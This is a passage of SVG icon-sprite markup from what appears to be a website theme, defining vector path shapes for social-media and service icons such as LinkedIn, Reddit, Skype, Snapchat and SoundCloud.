c0.315-0.315,0.615-0.51,1.035-0.673c0.317-0.123,0.794-0.27,1.671-0.31C9.312,4.631,9.597,4.622,12,4.622 M12,3 C9.556,3,9.249,3.01,8.289,3.054C7.331,3.098,6.677,3.25,6.105,3.472C5.513,3.702,5.011,4.01,4.511,4.511 c-0.5,0.5-0.808,1.002-1.038,1.594C3.25,6.677,3.098,7.331,3.054,8.289C3.01,9.249,3,9.556,3,12c0,2.444,0.01,2.751,0.054,3.711 c0.044,0.958,0.196,1.612,0.418,2.185c0.23,0.592,0.538,1.094,1.038,1.594c0.5,0.5,1.002,0.808,1.594,1.038 c0.572,0.222,1.227,0.375,2.185,0.418C9.249,20.99,9.556,21,12,21s2.751-0.01,3.711-0.054c0.958-0.044,1.612-0.196,2.185-0.418 c0.592-0.23,1.094-0.538,1.594-1.038c0.5-0.5,0.808-1.002,1.038-1.594c0.222-0.572,0.375-1.227,0.418-2.185 C20.99,14.751,21,14.444,21,12s-0.01-2.751-0.054-3.711c-0.044-0.958-0.196-1.612-0.418-2.185c-0.23-0.592-0.538-1.094-1.038-1.594 c-0.5-0.5-1.002-0.808-1.594-1.038c-0.572-0.222-1.227-0.375-2.185-0.418C14.751,3.01,14.444,3,12,3L12,3z M12,7.378 c-2.552,0-4.622,2.069-4.622,4.622S9.448,16.622,12,16.622s4.622-2.069,4.622-4.622S14.552,7.378,12,7.378z M12,15 c-1.657,0-3-1.343-3-3s1.343-3,3-3s3,1.343,3,3S13.657,15,12,15z M16.804,6.116c-0.596,0-1.08,0.484-1.08,1.08 s0.484,1.08,1.08,1.08c0.596,0,1.08-0.484,1.08-1.08S17.401,6.116,16.804,6.116z"/>
</symbol>
<symbol id="icon-linkedin" viewBox="0 0 24 24">
<path d="M19.7,3H4.3C3.582,3,3,3.582,3,4.3v15.4C3,20.418,3.582,21,4.3,21h15.4c0.718,0,1.3-0.582,1.3-1.3V4.3 C21,3.582,20.418,3,19.7,3z M8.339,18.338H5.667v-8.59h2.672V18.338z M7.004,8.574c-0.857,0-1.549-0.694-1.549-1.548 c0-0.855,0.691-1.548,1.549-1.548c0.854,0,1.547,0.694,1.547,1.548C8.551,7.881,7.858,8.574,7.004,8.574z M18.339,18.338h-2.669 v-4.177c0-0.996-0.017-2.278-1.387-2.278c-1.389,0-1.601,1.086-1.601,2.206v4.249h-2.667v-8.59h2.559v1.174h0.037 c0.356-0.675,1.227-1.387,2.526-1.387c2.703,0,3.203,1.779,3.203,4.092V18.338z"/>
</symbol>
<symbol id="icon-mail" viewBox="0 0 24 24">
<path d="M20,4H4C2.895,4,2,4.895,2,6v12c0,1.105,0.895,2,2,2h16c1.105,0,2-0.895,2-2V6C22,4.895,21.105,4,20,4z M20,8.236l-8,4.882 L4,8.236V6h16V8.236z"/>
</symbol>
<symbol id="icon-meetup" viewBox="0 0 24 24">
<path d="M19.24775,14.722a3.57032,3.57032,0,0,1-2.94457,3.52073,3.61886,3.61886,0,0,1-.64652.05634c-.07314-.0008-.10187.02846-.12507.09547A2.38881,2.38881,0,0,1,13.49453,20.094a2.33092,2.33092,0,0,1-1.827-.50716.13635.13635,0,0,0-.19878-.00408,3.191,3.191,0,0,1-2.104.60248,3.26309,3.26309,0,0,1-3.00324-2.71993,2.19076,2.19076,0,0,1-.03512-.30865c-.00156-.08579-.03413-.1189-.11608-.13493a2.86421,2.86421,0,0,1-1.23189-.56111,2.945,2.945,0,0,1-1.166-2.05749,2.97484,2.97484,0,0,1,.87524-2.50774.112.112,0,0,0,.02091-.16107,2.7213,2.7213,0,0,1-.36648-1.48A2.81256,2.81256,0,0,1,6.57673,7.58838a.35764.35764,0,0,0,.28869-.22819,4.2208,4.2208,0,0,1,6.02892-1.90111.25161.25161,0,0,0,.22023.0243,3.65608,3.65608,0,0,1,3.76031.90678A3.57244,3.57244,0,0,1,17.95918,8.626a2.97339,2.97339,0,0,1,.01829.57356.10637.10637,0,0,0,.0853.12792,1.97669,1.97669,0,0,1,1.27939,1.33733,2.00266,2.00266,0,0,1-.57112,2.12652c-.05284.05166-.04168.08328-.01173.13489A3.51189,3.51189,0,0,1,19.24775,14.722Zm-6.35959-.27836a1.6984,1.6984,0,0,0,1.14556,1.61113,3.82039,3.82039,0,0,0,1.036.17935,1.46888,1.46888,0,0,0,.73509-.12255.44082.44082,0,0,0,.26057-.44274.45312.45312,0,0,0-.29211-.43375.97191.97191,0,0,0-.20678-.063c-.21326-.03806-.42754-.0701-.63973-.11215a.54787.54787,0,0,1-.50172-.60926,2.75864,2.75864,0,0,1,.1773-.901c.1763-.535.414-1.045.64183-1.55913A12.686,12.686,0,0,0,15.85,10.47863a1.58461,1.58461,0,0,0,.04861-.87208,1.04531,1.04531,0,0,0-.85432-.83981,1.60658,1.60658,0,0,0-1.23654.16594.27593.27593,0,0,1-.36286-.03413c-.085-.0747-.16594-.15379-.24918-.23055a.98682.98682,0,0,0-1.33577-.04933,6.1468,6.1468,0,0,1-.4989.41615.47762.47762,0,0,1-.51535.03566c-.17448-.09307-.35512-.175-.53531-.25665a1.74949,1.74949,0,0,0-.56476-.2016,1.69943,1.69943,0,0,0-1.61654.91787,8.05815,8.05815,0,0,0-.32952.80126c-.45471,1.2557-.82507,2.53825-1.20838,3.81639a1.24151,1.24151,0,0,0,.51532,1.44389,1.42659,1.42659,0,0,0,1.22008.17166,1.09728,1.09728,0,0,0,.66994-.69764c.44145-1.04111.839-2.09989,1.25981-3.14926.11581-.28876.22792-.57874.35078-.86438a.44548.44548,0,0,1,.69189-.19539.50521.50521,0,0,1,.15044.43836,1.75625,1.75625,0,0,1-.14731.50453c-.27379.69219-.55265,1.38236-.82766,2.074a2.0836,2.0836,0,0,0-.14038.42876.50719.50719,0,0,0,.27082.57722.87236.87236,0,0,0,.66145.02739.99137.99137,0,0,0,.53406-.532q.61571-1.20914,1.228-2.42031.28423-.55863.57585-1.1133a.87189.87189,0,0,1,.29055-.35253.34987.34987,0,0,1,.37634-.01265.30291.30291,0,0,1,.12434.31459.56716.56716,0,0,1-.04655.1915c-.05318.12739-.10286.25669-.16183.38156-.34118.71775-.68754,1.43273-1.02568,2.152A2.00213,2.00213,0,0,0,12.88816,14.44366Zm4.78568,5.28972a.88573.88573,0,0,0-1.77139.00465.8857.8857,0,0,0,1.77139-.00465Zm-14.83838-7.296a.84329.84329,0,1,0,.00827-1.68655.8433.8433,0,0,0-.00827,1.68655Zm10.366-9.43673a.83506.83506,0,1,0-.0091,1.67.83505.83505,0,0,0,.0091-1.67Zm6.85014,5.22a.71651.71651,0,0,0-1.433.0093.71656.71656,0,0,0,1.433-.0093ZM5.37528,6.17908A.63823.63823,0,1,0,6.015,5.54483.62292.62292,0,0,0,5.37528,6.17908Zm6.68214,14.80843a.54949.54949,0,1,0-.55052.541A.54556.54556,0,0,0,12.05742,20.98752Zm8.53235-8.49689a.54777.54777,0,0,0-.54027.54023.53327.53327,0,0,0,.532.52293.51548.51548,0,0,0,.53272-.5237A.53187.53187,0,0,0,20.58977,12.49063ZM7.82846,2.4715a.44927.44927,0,1,0,.44484.44766A.43821.43821,0,0,0,7.82846,2.4715Zm13.775,7.60492a.41186.41186,0,0,0-.40065.39623.40178.40178,0,0,0,.40168.40168A.38994.38994,0,0,0,22,10.48172.39946.39946,0,0,0,21.60349,10.07642ZM5.79193,17.96207a.40469.40469,0,0,0-.397-.39646.399.399,0,0,0-.396.405.39234.39234,0,0,0,.39939.389A.39857.39857,0,0,0,5.79193,17.96207Z"/>
</symbol>
<symbol id="icon-medium" viewBox="0 0 24 24">
<path d="M5.727 8.027a.623.623 0 0 0-.204-.527L4.02 5.687v-.273H8.69l3.614 7.926 3.175-7.926h4.457v.274l-1.285 1.234a.367.367 0 0 0-.144.36v9.066a.374.374 0 0 0 .144.363l1.258 1.234v.27h-6.324v-.27l1.3-1.265c.13-.13.13-.164.13-.36V8.988l-3.621 9.196h-.489L6.691 8.988v6.164c-.035.258.051.52.235.707l1.691 2.055v.27h-4.8v-.27l1.69-2.055a.814.814 0 0 0 .22-.707zm0 0"/>
</symbol>
<symbol id="icon-patreon" viewBox="0 0 24 24">
<path d="M13.975 5a5.05 5.05 0 00-5.041 5.046c0 2.774 2.261 5.03 5.04 5.03A5.034 5.034 0 0019 10.047C19 7.264 16.746 5 13.975 5zM5 18.44h2.461V5H5v13.44z"/>
</symbol>
<symbol id="icon-pinterest" viewBox="0 0 24 24">
<path d="M12.289,2C6.617,2,3.606,5.648,3.606,9.622c0,1.846,1.025,4.146,2.666,4.878c0.25,0.111,0.381,0.063,0.439-0.169 c0.044-0.175,0.267-1.029,0.365-1.428c0.032-0.128,0.017-0.237-0.091-0.362C6.445,11.911,6.01,10.75,6.01,9.668 c0-2.777,2.194-5.464,5.933-5.464c3.23,0,5.49,2.108,5.49,5.122c0,3.407-1.794,5.768-4.13,5.768c-1.291,0-2.257-1.021-1.948-2.277 c0.372-1.495,1.089-3.112,1.089-4.191c0-0.967-0.542-1.775-1.663-1.775c-1.319,0-2.379,1.309-2.379,3.059 c0,1.115,0.394,1.869,0.394,1.869s-1.302,5.279-1.54,6.261c-0.405,1.666,0.053,4.368,0.094,4.604 c0.021,0.126,0.167,0.169,0.25,0.063c0.129-0.165,1.699-2.419,2.142-4.051c0.158-0.59,0.817-2.995,0.817-2.995 c0.43,0.784,1.681,1.446,3.013,1.446c3.963,0,6.822-3.494,6.822-7.833C20.394,5.112,16.849,2,12.289,2"/>
</symbol>
<symbol id="icon-pocket" viewBox="0 0 24 24">
<path d="M21.927,4.194C21.667,3.48,20.982,3,20.222,3h-0.01h-1.721H3.839C3.092,3,2.411,3.47,2.145,4.17 C2.066,4.378,2.026,4.594,2.026,4.814v6.035l0.069,1.2c0.29,2.73,1.707,5.115,3.899,6.778c0.039,0.03,0.079,0.059,0.119,0.089 l0.025,0.018c1.175,0.859,2.491,1.441,3.91,1.727c0.655,0.132,1.325,0.2,1.991,0.2c0.615,0,1.232-0.057,1.839-0.17 c0.073-0.014,0.145-0.028,0.219-0.044c0.02-0.004,0.042-0.012,0.064-0.023c1.359-0.297,2.621-0.864,3.753-1.691l0.025-0.018 c0.04-0.029,0.08-0.058,0.119-0.089c2.192-1.664,3.609-4.049,3.898-6.778l0.069-1.2V4.814C22.026,4.605,22,4.398,21.927,4.194z M17.692,10.481l-4.704,4.512c-0.266,0.254-0.608,0.382-0.949,0.382c-0.342,0-0.684-0.128-0.949-0.382l-4.705-4.512 C5.838,9.957,5.82,9.089,6.344,8.542c0.524-0.547,1.392-0.565,1.939-0.04l3.756,3.601l3.755-3.601 c0.547-0.524,1.415-0.506,1.939,0.04C18.256,9.089,18.238,9.956,17.692,10.481z"/>
</symbol>
<symbol id="icon-ravelry" viewBox="0 0 23 20">
<path d="M12.098 19.34a.25.25 0 01-.118-.043 13.986 13.986 0 01-.394-.258c-.164-.11-.477-.352-.934-.723-.46-.375-.882-.761-1.27-1.168-.39-.406-.796-.925-1.218-1.562a8.521 8.521 0 01-.976-1.926c-.125-.023-.758-.16-1.907-.414A8.785 8.785 0 007.84 17.29a8.152 8.152 0 004.258 2.05zm-6.98-6.762l1.831.313A13.424 13.424 0 016.5 11.02a16.216 16.216 0 01-.207-1.622l-.043-.593c-.61.61-1.047 1.445-1.316 2.5.035.484.097.91.183 1.273zm1.198-6.797a9.064 9.064 0 00-.84 1.653c.32-.344.59-.598.81-.758zm15.649 4.844a8.8 8.8 0 00-.676-3.426 8.85 8.85 0 00-1.824-2.812 8.614 8.614 0 00-2.727-1.883 8.115 8.115 0 00-3.312-.695 8.131 8.131 0 00-3.059.586A8.412 8.412 0 007.754 4.05c-.219.433-.383 1.027-.488 1.785a5.407 5.407 0 011.554-.93 7.481 7.481 0 011.727-.48 16.642 16.642 0 011.558-.153c.489-.02.883-.015 1.18.012l.438.035c.238.008.43.063.574.172a.66.66 0 01.27.367c.03.141.054.278.07.414a.8.8 0 01-.012.317 12.781 12.781 0 00-2.477-.004 7.093 7.093 0 00-1.992.484 9.6 9.6 0 00-1.554.801A12.46 12.46 0 007.176 7.97c.031.27.07.613.125 1.031.054.422.183 1.082.386 1.988.204.903.43 1.57.676 2.004.895.043 1.793-.012 2.696-.164.902-.152 1.683-.351 2.336-.598a20.681 20.681 0 001.77-.746c.526-.254.925-.472 1.19-.66l.407-.265c.156-.121.3-.196.43-.23a.367.367 0 01.331.058c.094.07.157.199.184.383.102.722-.039 1.171-.426 1.351-1.508.723-3.203 1.219-5.086 1.496-.976.149-2.129.207-3.449.176a7.673 7.673 0 001.195 1.973c.504.597 1 1.07 1.493 1.418.496.343.968.636 1.421.878.454.243.825.407 1.106.489l.426.133c1.039.171 1.992.113 2.863-.168 1.414-.739 2.555-1.813 3.418-3.227.867-1.414 1.297-2.969 1.297-4.664zm.805-.414c-.102 1.004-.247 1.793-.434 2.367-.508 1.547-1.168 2.836-1.977 3.867-.808 1.032-1.964 1.973-3.468 2.828-.348.247-.645.41-.895.493-.52.195-1.113.254-1.773.18-.262.019-.528.03-.797.03-2.055 0-3.883-.64-5.492-1.93-1.61-1.288-2.68-2.929-3.22-4.933-.007 0-.019 0-.042-.004-.024-.004-.04-.007-.055-.007-.043.375-.035.793.028 1.257.062.465.156.891.285 1.282.125.39.254.757.39 1.093.133.34.25.606.344.801l.152.29c.059.09.254.394.586.913a4.327 4.327 0 01-1.355-1.187 5.669 5.669 0 01-.856-1.563 14.087 14.087 0 01-.43-1.531 9.012 9.012 0 01-.19-1.2l-.02-.468c-.035-.016-.16-.059-.367-.137-.207-.078-.383-.148-.528-.203-.144-.054-.336-.133-.578-.226a9.221 9.221 0 01-.625-.282c-.176-.09-.36-.183-.543-.285-.187-.097-.34-.199-.465-.3a1.27 1.27 0 01-.27-.286c.138.075.321.172.548.285.23.118.64.286 1.23.508.594.223 1.121.364 1.586.426l.023-.36c.079-1.109.418-2.187 1.024-3.234A9.226 9.226 0 016.5 4.621c.203-.855.5-1.652.883-2.39.11-.208.226-.376.347-.5.125-.13.305-.247.536-.36 1.148-.55 2.25-.937 3.304-1.16A9.935 9.935 0 0114.86.09c1.136.14 2.25.5 3.34 1.082 1.593.855 2.804 2.105 3.624 3.75.82 1.644 1.137 3.406.946 5.289zm0 0"/>
</symbol>
<symbol id="icon-reddit" viewBox="0 0 24 24">
<path d="M22,11.816c0-1.256-1.021-2.277-2.277-2.277c-0.593,0-1.122,0.24-1.526,0.614c-1.481-0.965-3.455-1.594-5.647-1.69 l1.171-3.702l3.18,0.748c0.008,1.028,0.846,1.862,1.876,1.862c1.035,0,1.877-0.842,1.877-1.878c0-1.035-0.842-1.877-1.877-1.877 c-0.769,0-1.431,0.466-1.72,1.13l-3.508-0.826c-0.203-0.047-0.399,0.067-0.46,0.261l-1.35,4.268 c-2.316,0.038-4.411,0.67-5.97,1.671C5.368,9.765,4.853,9.539,4.277,9.539C3.021,9.539,2,10.56,2,11.816 c0,0.814,0.433,1.523,1.078,1.925c-0.037,0.221-0.061,0.444-0.061,0.672c0,3.292,4.011,5.97,8.941,5.97s8.941-2.678,8.941-5.97 c0-0.214-0.02-0.424-0.053-0.632C21.533,13.39,22,12.661,22,11.816z M18.776,4.394c0.606,0,1.1,0.493,1.1,1.1s-0.493,1.1-1.1,1.1 s-1.1-0.494-1.1-1.1S18.169,4.394,18.776,4.394z M2.777,11.816c0-0.827,0.672-1.5,1.499-1.5c0.313,0,0.598,0.103,0.838,0.269 c-0.851,0.676-1.477,1.479-1.812,2.36C2.983,12.672,2.777,12.27,2.777,11.816z M11.959,19.606c-4.501,0-8.164-2.329-8.164-5.193 S7.457,9.22,11.959,9.22s8.164,2.329,8.164,5.193S16.46,19.606,11.959,19.606z M20.636,13.001c-0.326-0.89-0.948-1.701-1.797-2.384 c0.248-0.186,0.55-0.301,0.883-0.301c0.827,0,1.5,0.673,1.5,1.5C21.223,12.299,20.992,12.727,20.636,13.001z M8.996,14.704 c-0.76,0-1.397-0.616-1.397-1.376c0-0.76,0.637-1.397,1.397-1.397c0.76,0,1.376,0.637,1.376,1.397 C10.372,14.088,9.756,14.704,8.996,14.704z M16.401,13.328c0,0.76-0.616,1.376-1.376,1.376c-0.76,0-1.399-0.616-1.399-1.376 c0-0.76,0.639-1.397,1.399-1.397C15.785,11.931,16.401,12.568,16.401,13.328z M15.229,16.708c0.152,0.152,0.152,0.398,0,0.55 c-0.674,0.674-1.727,1.002-3.219,1.002c-0.004,0-0.007-0.002-0.011-0.002c-0.004,0-0.007,0.002-0.011,0.002 c-1.492,0-2.544-0.328-3.218-1.002c-0.152-0.152-0.152-0.398,0-0.55c0.152-0.152,0.399-0.151,0.55,0 c0.521,0.521,1.394,0.775,2.669,0.775c0.004,0,0.007,0.002,0.011,0.002c0.004,0,0.007-0.002,0.011-0.002 c1.275,0,2.148-0.253,2.669-0.775C14.831,16.556,15.078,16.556,15.229,16.708z"/>
</symbol>
<symbol id="icon-skype" viewBox="0 0 24 24">
<path d="M10.113,2.699c0.033-0.006,0.067-0.013,0.1-0.02c0.033,0.017,0.066,0.033,0.098,0.051L10.113,2.699z M2.72,10.223 c-0.006,0.034-0.011,0.069-0.017,0.103c0.018,0.032,0.033,0.064,0.051,0.095L2.72,10.223z M21.275,13.771 c0.007-0.035,0.011-0.071,0.018-0.106c-0.018-0.031-0.033-0.064-0.052-0.095L21.275,13.771z M13.563,21.199 c0.032,0.019,0.065,0.035,0.096,0.053c0.036-0.006,0.071-0.011,0.105-0.017L13.563,21.199z M22,16.386 c0,1.494-0.581,2.898-1.637,3.953c-1.056,1.057-2.459,1.637-3.953,1.637c-0.967,0-1.914-0.251-2.75-0.725 c0.036-0.006,0.071-0.011,0.105-0.017l-0.202-0.035c0.032,0.019,0.065,0.035,0.096,0.053c-0.543,0.096-1.099,0.147-1.654,0.147 c-1.275,0-2.512-0.25-3.676-0.743c-1.125-0.474-2.135-1.156-3.002-2.023c-0.867-0.867-1.548-1.877-2.023-3.002 c-0.493-1.164-0.743-2.401-0.743-3.676c0-0.546,0.049-1.093,0.142-1.628c0.018,0.032,0.033,0.064,0.051,0.095L2.72,10.223 c-0.006,0.034-0.011,0.069-0.017,0.103C2.244,9.5,2,8.566,2,7.615c0-1.493,0.582-2.898,1.637-3.953 c1.056-1.056,2.46-1.638,3.953-1.638c0.915,0,1.818,0.228,2.622,0.655c-0.033,0.007-0.067,0.013-0.1,0.02l0.199,0.031 c-0.032-0.018-0.066-0.034-0.098-0.051c0.002,0,0.003-0.001,0.004-0.001c0.586-0.112,1.187-0.169,1.788-0.169 c1.275,0,2.512,0.249,3.676,0.742c1.124,0.476,2.135,1.156,3.002,2.024c0.868,0.867,1.548,1.877,2.024,3.002 c0.493,1.164,0.743,2.401,0.743,3.676c0,0.575-0.054,1.15-0.157,1.712c-0.018-0.031-0.033-0.064-0.052-0.095l0.034,0.201 c0.007-0.035,0.011-0.071,0.018-0.106C21.754,14.494,22,15.432,22,16.386z M16.817,14.138c0-1.331-0.613-2.743-3.033-3.282 l-2.209-0.49c-0.84-0.192-1.807-0.444-1.807-1.237c0-0.794,0.679-1.348,1.903-1.348c2.468,0,2.243,1.696,3.468,1.696 c0.645,0,1.209-0.379,1.209-1.031c0-1.521-2.435-2.663-4.5-2.663c-2.242,0-4.63,0.952-4.63,3.488c0,1.221,0.436,2.521,2.839,3.123 l2.984,0.745c0.903,0.223,1.129,0.731,1.129,1.189c0,0.762-0.758,1.507-2.129,1.507c-2.679,0-2.307-2.062-3.743-2.062 c-0.645,0-1.113,0.444-1.113,1.078c0,1.236,1.501,2.886,4.856,2.886C15.236,17.737,16.817,16.199,16.817,14.138z"/>
</symbol>
<symbol id="icon-slideshare" viewBox="0 0 24 24">
<path d="M11.738,10.232a2.142,2.142,0,0,1-.721,1.619,2.556,2.556,0,0,1-3.464,0,2.183,2.183,0,0,1,0-3.243,2.572,2.572,0,0,1,3.464,0A2.136,2.136,0,0,1,11.738,10.232Zm5.7,0a2.15,2.15,0,0,1-.715,1.619,2.563,2.563,0,0,1-3.469,0,2.183,2.183,0,0,1,0-3.243,2.58,2.58,0,0,1,3.469,0A2.144,2.144,0,0,1,17.439,10.232Zm2.555,2.045V4.7a2.128,2.128,0,0,0-.363-1.4,1.614,1.614,0,0,0-1.261-.415H5.742a1.656,1.656,0,0,0-1.278.386A2.246,2.246,0,0,0,4.129,4.7v7.643a8.212,8.212,0,0,0,1,.454q.516.193.92.318a6.847,6.847,0,0,0,.92.21q.516.085.806.125a6.615,6.615,0,0,0,.795.045l.665.006q.16,0,.642-.023t.506-.023a1.438,1.438,0,0,1,1.079.307,1.134,1.134,0,0,0,.114.1,7.215,7.215,0,0,0,.693.579q.079-1.033,1.34-.988.057,0,.415.017l.488.023q.13.006.517.011t.6-.011l.619-.051a5.419,5.419,0,0,0,.693-.1l.7-.153a5.353,5.353,0,0,0,.761-.221q.345-.131.766-.307a8.727,8.727,0,0,0,.818-.392Zm1.851-.057a10.4,10.4,0,0,1-4.225,2.862,6.5,6.5,0,0,1-.261,5.281,3.524,3.524,0,0,1-2.078,1.681,2.452,2.452,0,0,1-2.067-.17,1.915,1.915,0,0,1-.931-1.863l-.011-3.7V16.3l-.279-.068q-.188-.045-.267-.057l-.011,3.839a1.9,1.9,0,0,1-.943,1.863,2.481,2.481,0,0,1-2.078.17,3.519,3.519,0,0,1-2.067-1.7,6.546,6.546,0,0,1-.25-5.258A10.4,10.4,0,0,1,2.152,12.22a.56.56,0,0,1-.045-.715q.238-.3.681.011l.125.079a.767.767,0,0,1,.125.091V3.8a1.987,1.987,0,0,1,.534-1.4,1.7,1.7,0,0,1,1.295-.579H19.141a1.7,1.7,0,0,1,1.295.579,1.985,1.985,0,0,1,.534,1.4v7.882l.238-.17q.443-.307.681-.011a.56.56,0,0,1-.045.715Z"/>
</symbol>
<symbol id="icon-snapchat" viewBox="0 0 24 24">
<path d="M12.065,2a5.526,5.526,0,0,1,3.132.892A5.854,5.854,0,0,1,17.326,5.4a5.821,5.821,0,0,1,.351,2.33q0,.612-.117,2.487a.809.809,0,0,0,.365.091,1.93,1.93,0,0,0,.664-.176,1.93,1.93,0,0,1,.664-.176,1.3,1.3,0,0,1,.729.234.7.7,0,0,1,.351.6.839.839,0,0,1-.41.7,2.732,2.732,0,0,1-.9.41,3.192,3.192,0,0,0-.9.378.728.728,0,0,0-.41.618,1.575,1.575,0,0,0,.156.56,6.9,6.9,0,0,0,1.334,1.953,5.6,5.6,0,0,0,1.881,1.315,5.875,5.875,0,0,0,1.042.3.42.42,0,0,1,.365.456q0,.911-2.852,1.341a1.379,1.379,0,0,0-.143.507,1.8,1.8,0,0,1-.182.605.451.451,0,0,1-.429.241,5.878,5.878,0,0,1-.807-.085,5.917,5.917,0,0,0-.833-.085,4.217,4.217,0,0,0-.807.065,2.42,2.42,0,0,0-.82.293,6.682,6.682,0,0,0-.755.5q-.351.267-.755.527a3.886,3.886,0,0,1-.989.436A4.471,4.471,0,0,1,11.831,22a4.307,4.307,0,0,1-1.256-.176,3.784,3.784,0,0,1-.976-.436q-.4-.26-.749-.527a6.682,6.682,0,0,0-.755-.5,2.422,2.422,0,0,0-.807-.293,4.432,4.432,0,0,0-.82-.065,5.089,5.089,0,0,0-.853.1,5,5,0,0,1-.762.1.474.474,0,0,1-.456-.241,1.819,1.819,0,0,1-.182-.618,1.411,1.411,0,0,0-.143-.521q-2.852-.429-2.852-1.341a.42.42,0,0,1,.365-.456,5.793,5.793,0,0,0,1.042-.3,5.524,5.524,0,0,0,1.881-1.315,6.789,6.789,0,0,0,1.334-1.953A1.575,1.575,0,0,0,6,12.9a.728.728,0,0,0-.41-.618,3.323,3.323,0,0,0-.9-.384,2.912,2.912,0,0,1-.9-.41.814.814,0,0,1-.41-.684.71.71,0,0,1,.338-.593,1.208,1.208,0,0,1,.716-.241,1.976,1.976,0,0,1,.625.169,2.008,2.008,0,0,0,.69.169.919.919,0,0,0,.416-.091q-.117-1.849-.117-2.474A5.861,5.861,0,0,1,6.385,5.4,5.516,5.516,0,0,1,8.625,2.819,7.075,7.075,0,0,1,12.062,2Z"/>
</symbol>
<symbol id="icon-soundcloud" viewBox="0 0 24 24">
<path d="M8.9,16.1L9,14L8.9,9.5c0-0.1,0-0.1-0.1-0.1c0,0-0.1-0.1-0.1-0.1c-0.1,0-0.1,0-0.1,0.1c0,0-0.1,0.1-0.1,0.1L8.3,14l0.1,2.1 c0,0.1,0,0.1,0.1,0.1c0,0,0.1,0.1,0.1,0.1C8.8,16.3,8.9,16.3,8.9,16.1z M11.4,15.9l0.1-1.8L11.4,9c0-0.1,0-0.2-0.1-0.2 c0,0-0.1,0-0.1,0s-0.1,0-0.1,0c-0.1,0-0.1,0.1-0.1,0.2l0,0.1l-0.1,5c0,0,0,0.7,0.1,2v0c0,0.1,0,0.1,0.1,0.1c0.1,0.1,0.1,0.1,0.2,0.1 c0.1,0,0.1,0,0.2-0.1c0.1,0,0.1-0.1,0.1-0.2L11.4,15.9z M2.4,12.9L2.5,14l-0.2,1.1c0,0.1,0,0.1-0.1,0.1c0,0-0.1,0-0.1-0.1L2.1,14 l0.1-1.1C2.2,12.9,2.3,12.9,2.4,12.9C2.3,12.9,2.4,12.9,2.4,12.9z M3.1,12.2L3.3,14l-0.2,1.8c0,0.1,0,0.1-0.1,0.1 c-0.1,0-0.1,0-0.1-0.1L2.8,14L3,12.2C3,12.2,3,12.2,3.1,12.2C3.1,12.2,3.1,12.2,3.1,12.2z M3.9,11.9L4.1,14l-0.2,2.1 c0,0.1,0,0.1-0.1,0.1c-0.1,0-0.1,0-0.1-0.1L3.5,14l0.2-2.1c0-0.1,0-0.1,0.1-0.1C3.9,11.8,3.9,11.8,3.9,11.9z M4.7,11.9L4.9,14 l-0.2,2.1c0,0.1-0.1,0.1-0.1,0.1c-0.1,0-0.1,0-0.1-0.1L4.3,14l0.2-2.2c0-0.1,0-0.1,0.1-0.1C4.7,11.7,4.7,11.8,4.7,11.9z M5.6,12 l0.2,2l-0.2,2.1c0,0.1-0.1,0.1-0.1,0.1c0,0-0.1,0-0.1,0c0,0,0-0.1,0-0.1L5.1,14l0.2-2c0,0,0-0.1,0-0.1s0.1,0,0.1,0 C5.5,11.9,5.5,11.9,5.6,12L5.6,12z M6.4,10.7L6.6,14l-0.2,2.1c0,0,0,0.1,0,0.1c0,0-0.1,0-0.1,0c-0.1,0-0.1-0.1-0.2-0.2L5.9,14 l0.2-3.3c0-0.1,0.1-0.2,0.2-0.2c0,0,0.1,0,0.1,0C6.4,10.7,6.4,10.7,6.4,10.7z M7.2,10l0.2,4.1l-0.2,2.1c0,0,0,0.1,0,0.1 c0,0-0.1,0-0.1,0c-0.1,0-0.2-0.1-0.2-0.2l-0.1-2.1L6.8,10c0-0.1,0.1-0.2,0.2-0.2c0,0,0.1,0,0.1,0S7.2,9.9,7.2,10z M8,9.6L8.2,14 L8,16.1c0,0.1-0.1,0.2-0.2,0.2c-0.1,0-0.2-0.1-0.2-0.2L7.5,14l0.1-4.4c0-0.1,0-0.1,0.1-0.1c0,0,0.1-0.1,0.1-0.1c0.1,0,0.1,0,0.1,0.1 C8,9.6,8,9.6,8,9.6z M11.4,16.1L11.4,16.1L11.4,16.1z M9.7,9.6L9.8,14l-0.1,2.1c0,0.1,0,0.1-0.1,0.2s-0.1,0.1-0.2,0.1 c-0.1,0-0.1,0-0.1-0.1s-0.1-0.1-0.1-0.2L9.2,14l0.1-4.4c0-0.1,0-0.1,0.1-0.2s0.1-0.1,0.2-0.1c0.1,0,0.1,0,0.2,0.1S9.7,9.5,9.7,9.6 L9.7,9.6z M10.6,9.8l0.1,4.3l-0.1,2c0,0.1,0,0.1-0.1,0.2c0,0-0.1,0.1-0.2,0.1c-0.1,0-0.1,0-0.2-0.1c0,0-0.1-0.1-0.1-0.2L10,14 l0.1-4.3c0-0.1,0-0.1,0.1-0.2c0,0,0.1-0.1,0.2-0.1c0.1,0,0.1,0,0.2,0.1S10.6,9.7,10.6,9.8z M12.4,14l-0.1,2c0,0.1,0,0.1-0.1,0.2 c-0.1,0.1-0.1,0.1-0.2,0.1c-0.1,0-0.1,0-0.2-0.1c-0.1-0.1-0.1-0.1-0.1-0.2l-0.1-1l-0.1-1l0.1-5.5v0c0-0.1,0-0.2,0.1-0.2 c0.1,0,0.1-0.1,0.2-0.1c0,0,0.1,0,0.1,0c0.1,0,0.1,0.1,0.1,0.2L12.4,14z M22.1,13.9c0,0.7-0.2,1.3-0.7,1.7c-0.5,0.5-1.1,0.7-1.7,0.7 h-6.8c-0.1,0-0.1,0-0.2-0.1c-0.1-0.1-0.1-0.1-0.1-0.2V8.2c0-0.1,0.1-0.2,0.2-0.3c0.5-0.2,1-0.3,1.6-0.3c1.1,0,2.1,0.4,2.9,1.1 c0.8,0.8,1.3,1.7,1.4,2.8c0.3-0.1,0.6-0.2,1-0.2c0.7,0,1.3,0.2,1.7,0.7C21.8,12.6,22.1,13.2,22.1,13.9L22.1,13.9z"/>
</symbol>
<symbol id="icon-spotify" viewBox="0 0 24 24">
